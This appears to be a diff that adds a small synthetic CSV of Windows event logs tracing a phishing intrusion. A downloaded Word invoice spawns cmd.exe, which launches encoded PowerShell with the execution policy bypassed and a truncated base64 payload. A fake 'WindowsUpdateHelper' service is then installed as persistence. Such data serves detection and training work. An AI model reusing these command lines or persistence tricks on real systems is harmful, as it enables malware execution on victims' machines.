@@ -1,0 +1,7 @@
+timestamp,event_id,event_name,process_name,parent_process,command_line,user
+2026-10-02 14:10:02,4624,Logon,lsass.exe,wininit.exe,N/A,taylor
+2026-10-02 14:12:15,4688,Process_Created,outlook.exe,explorer.exe,"C:\Program Files\Outlook\outlook.exe",taylor
+2026-10-02 14:14:30,4688,Process_Created,word.exe,outlook.exe,"C:\Program Files\Word\winword.exe /n C:\Users\taylor\Downloads\Invoice.docx",taylor
+2026-10-02 14:14:35,4688,Process_Created,cmd.exe,winword.exe,"cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -enc aWV4IChOZXctT2JqZWN0... (Base64 Payload)",taylor
+2026-10-02 14:14:40,4688,Process_Created,powershell.exe,cmd.exe,"powershell.exe -enc aWV4IChNZXct...",taylor
+2026-10-02 14:15:10,7045,Service_Installed,services.exe,wininit.exe,"New Service: 'WindowsUpdateHelper' -> Path: C:\Users\Public\svchost_fake.exe",SYSTEM
